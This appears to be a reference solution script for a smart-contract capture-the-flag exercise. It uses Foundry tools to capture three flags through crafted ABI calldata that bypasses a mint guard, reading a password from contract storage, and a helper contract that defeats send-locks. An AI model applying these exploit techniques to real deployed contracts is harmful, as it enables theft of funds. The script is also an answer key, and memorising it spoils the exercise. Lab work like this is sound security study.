#!/usr/bin/env python3
"""Reference solution — must capture flags 1, 7, 8 (harness exit test)."""
import json
import subprocess
import sys
from pathlib import Path


def cast(*args):
    p = subprocess.run(["cast", *args], capture_output=True, text=True, timeout=120)
    if p.returncode != 0:
        sys.exit(f"cast {' '.join(args[:3])} failed: {p.stderr[:300]}")
    return p.stdout.strip()


def send(rpc, key, to, *args, value=None):
    cmd = ["send", "--rpc-url", rpc, "--private-key", key, to, *args]
    if value is not None:
        cmd += ["--value", str(value)]
    return cast(*cmd)


def deploy(rpc, key, creation):
    return json.loads(cast("send", "--rpc-url", rpc, "--private-key", key,
                           "--create", creation, "--json"))["contractAddress"]


def pad(a):
    return a.lower().replace("0x", "").rjust(64, "0")


def main():
    p = json.loads(Path("params.json").read_text())
    rpc = p["rpc_url"]
    key = Path(p["key_file"]).read_text().strip()

    # Flag 1
    send(rpc, key, p["challenge1"], "registerTeam(string,uint8)", "reference", "1")

    # Flag 7 — craft calldata: mint(bytes) selector, offset 0x60, a padding
    # word, then the mintFlag selector sitting at absolute offset 68 (so the
    # onlyMintFlag guard is satisfied), then length=4 + allowMinter content
    # (what actually gets self-called).
    mint_sel = cast("sig", "mint(bytes)")[2:]
    allow_sel = cast("sig", "allowMinter()")[2:]
    mf_sel = cast("sig", "mintFlag()")[2:]
    calldata = ("0x" + mint_sel
                + f"{0x60:064x}"          # offset -> length word at abs 100
                + "00" * 32               # padding word (abs 36..68)
                + mf_sel + "00" * 28      # word at abs 68: mintFlag selector
                + f"{4:064x}"             # length = 4
                + allow_sel + "00" * 28)  # _data content: allowMinter()
    send(rpc, key, p["challenge7"], calldata)          # becomes an allowed minter
    send(rpc, key, p["challenge7"], "mint(bytes)", "0x" + mf_sel)   # self-calls mintFlag

    # Flag 8 — read the password from storage slot 1, zero the byte the count-0
    # mask clears (the most-significant byte: 0xFF << 248), then satisfy the
    # send-locks with a helper whose receive() reverts on 1 wei but not 2.
    stored = cast("storage", "--rpc-url", rpc, p["challenge8"], "1")
    masked = "0x%064x" % (int(stored, 16) & ((1 << 248) - 1))
    Path("src/H8.sol").write_text("""//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
interface IC8 { function mintFlag(bytes32) external payable; }
contract H8 {
    address c;
    constructor(address _c) { c = _c; }
    function go(bytes32 pw) external payable { IC8(c).mintFlag{value: 2}(pw); }
    receive() external payable { require(msg.value != 1, "no1"); }
}
""")
    if subprocess.run(["forge", "build"], capture_output=True, text=True).returncode != 0:
        sys.exit("forge build failed")
    h8_code = json.loads(Path("out/H8.sol/H8.json").read_text())["bytecode"]["object"]
    h8 = deploy(rpc, key, h8_code + pad(p["challenge8"]))
    send(rpc, key, h8, value=1000)                     # fund the helper
    send(rpc, key, h8, "go(bytes32)", masked)

    print("captured flags 1, 7, 8")


if __name__ == "__main__":
    main()
